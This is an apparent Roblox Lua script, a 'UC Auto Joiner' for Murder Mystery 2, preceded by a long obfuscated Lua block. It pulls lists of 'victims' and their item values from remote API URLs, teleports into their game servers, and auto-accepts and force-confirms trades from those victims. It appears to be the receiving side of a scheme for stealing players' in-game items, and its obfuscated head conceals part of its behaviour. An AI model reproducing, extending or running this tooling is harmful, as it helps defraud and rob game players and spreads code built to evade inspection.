\UST9$3j!/p"S4j0-=kN1of1E,YOjgWpD=^OD6t#\GE`@Ar@NGVt%?Hh.0FR@aHWf8&Wa=ZhA)$p8KSq);s1iE,_)CqRL#kcS+lIROo3^])k(Z8uDJVh%9(cV[b9a^$BM(+p2<DHdf)Veq;$grNiY&iQO2$giNIBI8+S5W]?hl"X^dbh.@O/dG,,n]3<&=6hO0QU,Q@+q9X9o23VU,nfn[0'lQ*aeK&(H\JaU6du13+)?SPUmkKfR8*95hW2lLYH8c\]]@OO-..%lk0O-7\B!8RdG1E*H9B(G!047A+>*V^h?)Cn*Ut;fZ)'<G3XH($j.TKgrl)i`6_-\.?/CN16Zg(9i#p'EVJ@dj\G,OYM&"+^u)dRS!9MO="fe[8Kqol;)o'ZCm7:!>L*us+D'c#PQgo?*QcKo.ls4fbIO^Oa"KNH&;;bPW?!9c!5V=qG?#l)7F;gCXqo$QTsXq!<UJEN3e!P<<VAbs83i24lq:!E3ic.QGCp4Ao9@nDYc+2WI:RHo^FXnB\cHb?(F4mKPLI6Lr(gBuoekYSuHg3'oC*-MPk#bU+^8nHG/-]W0$a92CYI8Op5S)(C+m]^_[*i1\q*A?fda.jn]bkVdhYr!'<NCABPJl24M&f6b.&!6&f4Et\sf"T*T/8"2g;9*-t*KA"Ep7u"$4HqFR-EdgsCD[M6[h]</R*7ES_+<SEE`[\7i.N62/igqZ;e%_!/2n9Ijds!;3pGFJ=j-A$eI7gUXeT>cE(@Sb0Fnb"l$/3W5C,GYN[Wc8FhMRj;)b"i\<Q\,;g(&W*8;Yf)M64DQ#F,uC[@YhSBr7@^6Fe&KSs.#M>rI"E*[Q/?<MQp)fU_=$g+41]6"Z-c0Y?o"uYd/0#=<GU<BX'0I5Fk&'\&S/]d!qU'^<IU&b:>;[IP:0mO"<fEWT+Mr[DcJKfW^#b$n^&HW5hr-n]==])bg=1 bh=nil cc=-31489 else if cc<=88254 then br=function(a)local a,b=d(a,bg,bg+1)bg=bg+2;return((b*256)+a);end cc=58842 else bp=function(a)local a=bo(a)local b=i(a/2)if(a%2)==0 then return b;end;return-b-1;end cb[2]=(cb[2]+1)%5 cc=43086 end end else if cc>=83715 then if cc==83715 then ca[830]={}cc=42086 else bq=function(a)local a,b,e,f=d(a,bg,bg+3)bg=bg+4;return((f*16777216)+(e*65536)+(b*256)+a);end cd=cb[3]~=0 and 88254 or 70976 cc=70976 end else bo=nil cd,cc=-15930,-15930 end end else if cc>=78384 then if cc>=81347 then if cc~=81441 then bi=function(a)local b=0 for e=0,3 do b=u(b,v(d(a,bg,bg),8*e));bg=bg+1;end;return b;end cc=78119 else bj=function(a)local b=0 for e=0,2 do b=u(b,v(d(a,bg,bg),8*e));bg=bg+1;end;return b;end cc=60392 end else bm=function(a)local b=0 b=d(a,bg);bg=bg+1;return b;end cc=-27044 end else if cc==71103 then t=p and p[(function(a,b)local e local f={}local g={}g[1]=2 g[2]=0 g[3]=2 local j=-13400 local k=0 repeat if j<=-37937 then break else if j<=-13400 then f[47]={}g[3]=(g[3]+1)%5 k,j=-12762,-12762 else e=f[47]for f=1,#a do local a=d(a,f)e[f]=n(c(37,99),(a-(b+f))%256)end return h(e)end end until j==-37937 end)("\175\198\190\194",76)]or function(a,b)local e local f={}local f={}f[1]=0 f[2]=4 f[3]=0 local f=0 local g=-32728 repeat if g<=-46038 then break else if g==-32728 then e=0 for j=0,31 do local k local l={}local l={}l[1]=4 l[2]=0 l[3]=1 local l=0 local m=-14091 repeat if m<=-45768 then break else if m==-14091 then k=a/2+b/2 if k~=i(k)then e=e+2^j;end;a=i(a/2)l,m=89214,89214 else b=i(b/2)m=-45768 end end until m==-45768 end;f,g=-12709,-12709 else return e;end end until g==-46038 end u=p and p[(function(a,b)local e={}for f=1,#a do local a=d(a,f)e[f]=n(c(37,99),(a-(b+f))%256)end return h(e)end)("\115\129\133",16)]or function(a,b)local c=0 local d=1 while a>0 or b>0 do local e=a%2 local f=b%2 if e==1 or f==1 then c=c+d;end;a=i(a/2);b=i(b/2);d=d*2;end;return c;end v=nil cd,cc=-43406,-43406 else bj=nil cc=81441 end end end end end until cc==-37816 end)(error,next,string.match,tonumber,string.gsub,string.sub,table.insert,string.char,string.byte,coroutine.yield,coroutine.wrap,string.rep,table.concat,math.floor,select,(getfenv or function()return _ENV;end),setmetatable,next,(table.unpack or unpack),(table.pack or function(...)return{...};end),math.min,(function(b)if b<=1 then return false end;if b<=3 then return true end;if b%2==0 or b%3==0 then return false end;local c=5;while c*c<=b do if b%c==0 or b%(c+2)==0 then return false end;c=c+6 end;return true end),string.len,table.remove,table.sort,(string.unpack),string.gmatch,string.find,string.reverse,tostring,math.abs,rawget,string.format);
+local t_wait, t_spawn, i_new = task.wait, task.spawn, Instance.new
+local s_format, s_lower, s_gsub, s_reverse = string.format, string.lower, string.gsub, string.reverse
+local t_sort, t_insert, t_remove = table.sort, table.insert, table.remove
+
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+local FOLDER_NAME, CONFIG_FILE = "CheetosData", "config.json"
+local CONFIG_PATH = FOLDER_NAME .. "/" .. CONFIG_FILE
+local CurrentJobId, PlaceId = game.JobId, game.PlaceId
+local isMM2 = (PlaceId == 142823291 or PlaceId == 10705210188)
+
+local State = {Victims = {}, LastRefresh = 0, Blacklist = {}, FailedThisCycle = {}, IsTeleporting = false, CurrentTarget = nil, ReceiverActive = false, Gradients = {}}
+local Config = {ApiUrls = {}, ApiUrl = "", ScriptUrl = "", AutoJoin = false, MinTargetValue = 10, RefreshRate = 1, TargetIndex = 1}
+
+local function LoadConfig()
+    if isfolder(FOLDER_NAME) and isfile(CONFIG_PATH) then
+        local s, data = pcall(readfile, CONFIG_PATH)
+        if s and data then
+            local decoded = HttpService:JSONDecode(data)
+            for k, v in pairs(decoded) do Config[k] = v end
+        end
+    end
+    if getgenv().JoinerConfig then
+        for k, v in pairs(getgenv().JoinerConfig) do if v ~= nil then Config[k] = v end end
+    end
+end
+LoadConfig()
+
+local function SaveConfig()
+    if not isfolder(FOLDER_NAME) then makefolder(FOLDER_NAME) end
+    pcall(writefile, CONFIG_PATH, HttpService:JSONEncode(Config))
+end
+
+if CoreGui:FindFirstChild("CheetosJoinerUI") then CoreGui.CheetosJoinerUI:Destroy() end
+local ScreenGui = i_new("ScreenGui", CoreGui)
+ScreenGui.Name = "CheetosJoinerUI"
+ScreenGui.ResetOnSpawn = false
+
+local function s(val) return val * 0.5 end
+
+local function applyLedEffect(element, scaleFunc)
+    local ledStroke = i_new("UIStroke", element)
+    ledStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    ledStroke.Thickness = scaleFunc(2)
+    local ledGradient = i_new("UIGradient", ledStroke)
+    ledGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
+    })
+    t_insert(State.Gradients, ledGradient)
+end
+
+RunService.RenderStepped:Connect(function()
+    local offset = Vector2.new(tick() % 2 - 1, 0)
+    for i = 1, #State.Gradients do State.Gradients[i].Offset = offset end
+end)
+
+local function formatValue(v)
+    return s_reverse(s_gsub(s_reverse(tostring(v)), '(%d%d%d)', '%1,')):gsub('^,', '')
+end
+
+local MainFrame = i_new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, s(500), 0, s(350))
+MainFrame.Position = UDim2.new(0.5, s(-250), 0, s(10)) 
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BackgroundTransparency = 0.1
+MainFrame.Active, MainFrame.Draggable = true, true
+i_new("UICorner", MainFrame).CornerRadius = UDim.new(0, s(8))
+applyLedEffect(MainFrame, s)
+
+local InnerFrame = i_new("Frame", MainFrame)
+InnerFrame.Size = UDim2.new(1, s(-10), 1, s(-10))
+InnerFrame.Position = UDim2.new(0, s(5), 0, s(5))
+InnerFrame.BackgroundTransparency = 1
+
+local TitleBar = i_new("Frame", InnerFrame)
+TitleBar.Size = UDim2.new(1, 0, 0, s(35))
+TitleBar.BackgroundTransparency = 1
+
+local TitleLabel = i_new("TextLabel", TitleBar)
+TitleLabel.Size = UDim2.new(1, 0, 1, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "UC Auto Joiner (MM2 Only)"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.Font, TitleLabel.TextSize = Enum.Font.GothamBold, s(18)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local MinimizeBtn = i_new("TextButton", TitleBar)
+MinimizeBtn.Size = UDim2.new(0, s(30), 0, s(30))
+MinimizeBtn.Position = UDim2.new(1, -s(30), 0, 0)
+MinimizeBtn.BackgroundTransparency = 1
+MinimizeBtn.Text, MinimizeBtn.TextColor3 = "-", Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Font, MinimizeBtn.TextSize = Enum.Font.GothamBold, s(24)
+
+local ToggleHandle = i_new("TextButton", ScreenGui)
+ToggleHandle.Size = UDim2.new(0, s(100), 0, s(30))
+ToggleHandle.Position = UDim2.new(0.5, s(-50), 0, 0)
+ToggleHandle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ToggleHandle.Text = "▼"
+ToggleHandle.Font, ToggleHandle.TextColor3, ToggleHandle.TextSize = Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(20)
+ToggleHandle.Visible = false 
+i_new("UICorner", ToggleHandle).CornerRadius = UDim.new(0, s(6))
+applyLedEffect(ToggleHandle, s)
+
+local function toggleGUI(show)
+    local targetPos = show and UDim2.new(0.5, s(-250), 0, s(10)) or UDim2.new(0.5, s(-250), 0, s(-360))
+    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = targetPos}):Play()
+    ToggleHandle.Visible = not show
+end
+MinimizeBtn.MouseButton1Click:Connect(function() toggleGUI(false) end)
+ToggleHandle.MouseButton1Click:Connect(function() toggleGUI(true) end)
+
+local TabFrame = i_new("Frame", InnerFrame)
+TabFrame.Size = UDim2.new(1, 0, 0, s(30))
+TabFrame.Position = UDim2.new(0, 0, 0, s(40))
+TabFrame.BackgroundTransparency = 1
+i_new("UIListLayout", TabFrame).FillDirection = Enum.FillDirection.Horizontal
+TabFrame.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+TabFrame.UIListLayout.Padding = UDim.new(0, s(5))
+
+local ContentFrame = i_new("Frame", InnerFrame)
+ContentFrame.Size = UDim2.new(1, 0, 1, s(-80))
+ContentFrame.Position = UDim2.new(0, 0, 0, s(75))
+ContentFrame.BackgroundTransparency = 1
+
+local Tabs = {"Targets", "Settings", "Status"}
+local TabButtons, Pages = {}, {}
+for i, tabName in ipairs(Tabs) do
+    local btn = i_new("TextButton", TabFrame)
+    btn.Size = UDim2.new(0, s(100), 1, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundTransparency = 0.8
+    btn.Font, btn.Text, btn.TextSize = Enum.Font.GothamSemibold, tabName, s(14)
+    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    i_new("UICorner", btn).CornerRadius = UDim.new(0, s(6))
+    applyLedEffect(btn, s)
+    TabButtons[tabName] = btn
+    local page = i_new("Frame", ContentFrame)
+    page.Size, page.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
+    page.Visible = (i == 1)
+    Pages[tabName] = page
+end
+
+local function switchTab(target)
+    for name, btn in pairs(TabButtons) do
+        local active = (name == target)
+        btn.BackgroundTransparency = active and 0.5 or 0.8
+        btn.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 200)
+        Pages[name].Visible = active
+    end
+end
+for name, btn in pairs(TabButtons) do btn.MouseButton1Click:Connect(function() switchTab(name) end) end
+
+local Container = i_new("ScrollingFrame", Pages.Targets)
+Container.Size, Container.BackgroundTransparency, Container.BorderSizePixel = UDim2.new(1, 0, 1, 0), 1, 0
+Container.ScrollBarThickness, Container.CanvasSize = s(4), UDim2.new(0, 0, 0, 0)
+i_new("UIListLayout", Container).Padding = UDim.new(0, s(8))
+
+i_new("UIListLayout", Pages.Settings).Padding = UDim.new(0, s(10))
+local function createToggle(parent, text, key)
+    local frame = i_new("Frame", parent)
+    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
+    local label = i_new("TextLabel", frame)
+    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
+    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
+    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    local bg = i_new("TextButton", frame)
+    bg.Size, bg.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
+    bg.BackgroundColor3, bg.Text = Color3.fromRGB(255, 255, 255), ""
+    bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
+    i_new("UICorner", bg).CornerRadius = UDim.new(0, s(12))
+    applyLedEffect(bg, s)
+    local knob = i_new("Frame", bg)
+    knob.Size, knob.BackgroundColor3 = UDim2.new(0, s(20), 0, s(20)), Color3.fromRGB(255, 255, 255)
+    knob.Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))
+    i_new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+    bg.MouseButton1Click:Connect(function()
+        Config[key] = not Config[key]
+        bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
+        TweenService:Create(knob, TweenInfo.new(0.2), {Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))}):Play()
+        SaveConfig()
+    end)
+end
+
+local function createInput(parent, text, key)
+    local frame = i_new("Frame", parent)
+    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
+    local label = i_new("TextLabel", frame)
+    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
+    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
+    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    local box = i_new("TextBox", frame)
+    box.Size, box.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
+    box.BackgroundColor3, box.TextColor3 = Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
+    box.Text, box.Font, box.TextSize = tostring(Config[key]), Enum.Font.Gotham, s(14)
+    i_new("UICorner", box).CornerRadius = UDim.new(0, s(6))
+    applyLedEffect(box, s)
+    box.FocusLost:Connect(function()
+        local n = tonumber(box.Text)
+        if n then Config[key] = n; SaveConfig() else box.Text = tostring(Config[key]) end
+    end)
+end
+
+createToggle(Pages.Settings, "Auto Join", "AutoJoin")
+createInput(Pages.Settings, "Min Value", "MinTargetValue")
+createInput(Pages.Settings, "Target Index", "TargetIndex")
+
+i_new("UIListLayout", Pages.Status).Padding = UDim.new(0, s(5))
+local function createStatusLabel(text)
+    local label = i_new("TextLabel", Pages.Status)
+    label.Size, label.BackgroundTransparency = UDim2.new(1, 0, 0, s(30)), 1
+    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(200, 200, 200), text
+    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    return label
+end
+local MainStatus = createStatusLabel("Status: Initializing...")
+local HitsLabel = createStatusLabel("Available Hits: 0")
+local TopHitLabel = createStatusLabel("Top Target: None")
+local function setStatus(msg) MainStatus.Text = "Status: " .. msg end
+
+TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
+    if result == Enum.TeleportResult.GameFull or result == Enum.TeleportResult.ServerFull then
+        if State.LastAttemptedJob then State.FailedThisCycle[State.LastAttemptedJob] = true; setStatus("Full - Skipping") end
+    end
+end)
+
+local function SafeTeleport(placeId, jobId)
+    State.LastAttemptedJob = jobId
+    TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+end
+
+local function parseJobId(link)
+    if not link then return nil end
+    return link:match("gameInstanceId=([%w%-]+)") or link:match("JobId=([%w%-]+)")
+end
+
+local function parsePlaceId(link)
+    if not link then return nil end
+    return link:match("games/(%d+)") or link:match("placeId=(%d+)")
+end
+
+if isMM2 then
+    task.spawn(function()
+        local remotes = ReplicatedStorage:WaitForChild("Remotes")
+        local loadedRemote = remotes:WaitForChild("Extras"):WaitForChild("LoadedCompletely")
+        while true do
+            local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+            if PlayerGui then
+                local guiNames = {"Loading", "DeviceSelect", "Join", "JoinPhone"}
+                for _, name in ipairs(guiNames) do local screen = PlayerGui:FindFirstChild(name) if screen then screen:Destroy() end end
+                PlayerGui:SetAttribute("Device", "PC")
+                if not PlayerGui:FindFirstChild("MainGUI") then
+                    local gf = ReplicatedStorage:FindFirstChild("GUI")
+                    local mainGui = gf and (gf:FindFirstChild("MainPC") or gf:FindFirstChild("MainMobile"))
+                    if mainGui then local c = mainGui:Clone() c.Name = "MainGUI"; c.Parent = PlayerGui end
+                end
+                pcall(function() game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+                loadedRemote:FireServer()
+            end
+            t_wait(0.1)
+        end
+    end)
+end
+
+local function createRow(victim)
+    local Row = i_new("Frame", Container)
+    Row.Size, Row.BackgroundColor3, Row.BackgroundTransparency = UDim2.new(1, 0, 0, s(60)), Color3.fromRGB(40, 40, 45), 0.3
+    i_new("UICorner", Row).CornerRadius = UDim.new(0, s(6))
+    applyLedEffect(Row, s)
+    local NameLbl = i_new("TextLabel", Row)
+    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = victim.victim, Enum.Font.GothamBold, s(16), Color3.fromRGB(255, 255, 255)
+    NameLbl.Position, NameLbl.Size, NameLbl.BackgroundTransparency = UDim2.new(0, s(10), 0, s(5)), UDim2.new(0.5, 0, 0.5, 0), 1
+    NameLbl.TextXAlignment = Enum.TextXAlignment.Left
+    local ValLbl = i_new("TextLabel", Row)
+    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = "RAP: " .. formatValue(victim.val), Enum.Font.Gotham, s(14), Color3.fromRGB(100, 255, 100)
+    ValLbl.Position, ValLbl.Size, ValLbl.BackgroundTransparency = UDim2.new(0, s(10), 0.5, 0), UDim2.new(0.5, 0, 0.5, 0), 1
+    ValLbl.TextXAlignment = Enum.TextXAlignment.Left
+    local JoinBtn = i_new("TextButton", Row)
+    JoinBtn.Size, JoinBtn.Position, JoinBtn.BackgroundColor3 = UDim2.new(0.2, 0, 0.6, 0), UDim2.new(0.55, 0, 0.2, 0), Color3.fromRGB(60, 60, 255)
+    JoinBtn.Text, JoinBtn.Font, JoinBtn.TextColor3, JoinBtn.TextSize = "JOIN", Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(14)
+    i_new("UICorner", JoinBtn).CornerRadius = UDim.new(0, s(6))
+    applyLedEffect(JoinBtn, s)
+    JoinBtn.MouseButton1Click:Connect(function()
+        local jId = parseJobId(victim.link)
+        if jId then setStatus("Teleporting to " .. victim.victim); SafeTeleport(tonumber(parsePlaceId(victim.link) or 142823291), jId) end
+    end)
+end
+
+local function refreshList()
+    for _, c in ipairs(Container:GetChildren()) do if not c:IsA("UIListLayout") then c:Destroy() end end
+    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
+    HitsLabel.Text = "Available Hits: " .. #State.Victims
+    if #State.Victims == 0 then
+        local el = i_new("TextLabel", Container)
+        el.Text, el.Size, el.BackgroundTransparency, el.TextColor3 = "No Active Targets", UDim2.new(1, 0, 0, s(40)), 1, Color3.fromRGB(150, 150, 150)
+        el.Font, el.TextSize = Enum.Font.Gotham, s(14)
+    else for _, v in ipairs(State.Victims) do createRow(v) end end
+    Container.CanvasSize = UDim2.new(0, 0, 0, #State.Victims * s(70))
+end
+
+local function fetchVictims()
+    local all = {}
+    local sources = Config.ApiUrls or {}
+    if (not sources or not next(sources)) and Config.ApiUrl ~= "" then sources = {Config.ApiUrl} end
+    for _, url in pairs(sources) do
+        if url and url ~= "" then
+            local s, res = pcall(function() return HttpService:JSONDecode(game:HttpGet(url:gsub("http://", "https://") .. "?t=" .. os.time())) end)
+            if s and type(res) == "table" then
+                for _, v in ipairs(res) do if tostring(v.link):find("142823291") or tostring(v.link):find("10705210188") then t_insert(all, v) end end
+            end
+        end
+    end
+    State.Victims = all
+    refreshList()
+    setStatus("Synced: " .. #State.Victims)
+end
+
+local function AutoJoinStep()
+    if not Config.AutoJoin or State.IsTeleporting or State.ReceiverActive then return end
+    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
+    local mv = tonumber(Config.MinTargetValue) or 0
+    for _, v in ipairs(State.Victims) do
+        if tonumber(v.val) >= mv then
+            local job = parseJobId(v.link)
+            if job == CurrentJobId and Players:FindFirstChild(v.victim) then
+                setStatus("Locked on: " .. v.victim)
+                TopHitLabel.Text = "Farming: " .. v.victim
+                State.CurrentTarget = v; State.FailedThisCycle = {}
+                return
+            end
+        end
+    end
+    local si = Config.TargetIndex or 1
+    local found = false
+    for i = si, #State.Victims do
+        local t = State.Victims[i]
+        if tonumber(t.val) >= mv then
+            local j = parseJobId(t.link)
+            if j and j ~= CurrentJobId then
+                found = true
+                if not State.FailedThisCycle[j] then
+                    State.CurrentTarget = t
+                    setStatus("Chasing #"..i); SafeTeleport(tonumber(parsePlaceId(t.link) or 142823291), j)
+                    return
+                end
+            end
+        end
+    end
+    if found then setStatus("Cycle Finished - Resetting"); State.FailedThisCycle = {} end
+end
+
+function startReceiver()
+    if isMM2 then
+        task.spawn(function()
+            local function mm2Main()
+                local Trade = ReplicatedStorage:WaitForChild("Trade", 20)
+                if not Trade then return end
+                local function isV(p)
+                    if not p then return false end
+                    local n = s_lower(p.Name)
+                    for _, v in ipairs(State.Victims) do if n:find(s_lower(v.victim)) then return true end end
+                    return false
+                end
+                local function accept(tn)
+                    State.ReceiverActive = true
+                    local st = tick()
+                    while tick() - st < 3 do
+                        Trade.AcceptRequest:FireServer()
+                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                        if s and res == "StartTrade" then break end
+                        t_wait(0.1)
+                    end
+                end
+                t_spawn(function()
+                    while true do
+                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                        if s and res == "ReceivingRequest" then Trade.AcceptRequest:FireServer(); State.ReceiverActive = true end
+                        t_wait(0.5)
+                    end
+                end)
+                t_spawn(function()
+                    while true do
+                        pcall(function()
+                            local sr = Trade:FindFirstChild("SendRequest")
+                            if sr then sr.OnClientInvoke = function(s) if isV(s) then accept(s.Name); return true end; Trade.DeclineRequest:FireServer(); return false end end
+                            Trade.SetRequestsEnabled:FireServer(true)
+                        end)
+                        t_wait(1)
+                    end
+                end)
+                local lov, ctid = 0, 428469873
+                Trade.UpdateTrade.OnClientEvent:Connect(function(d) if d then lov = d.LastOffer or lov; ctid = d.TradeId or ctid end end)
+                while true do
+                    local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                    if s and res == 'StartTrade' then
+                        State.ReceiverActive = true
+                        while true do
+                            Trade.AcceptTrade:FireServer(ctid, lov)
+                            t_wait(0.1)
+                            local s2, cur = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                            if not s2 or cur ~= 'StartTrade' then break end
+                        end
+                    end
+                    State.ReceiverActive = false
+                    t_wait(0.5)
+                end
+            end
+            while true do pcall(mm2Main); t_wait(2) end
+        end)
+    end
+end
+
+t_spawn(function() while true do fetchVictims(); t_wait(Config.RefreshRate or 1) end end)
+t_spawn(function() while true do AutoJoinStep(); t_wait(1) end end)
+t_spawn(startReceiver)
+setStatus("Turbo Ready")
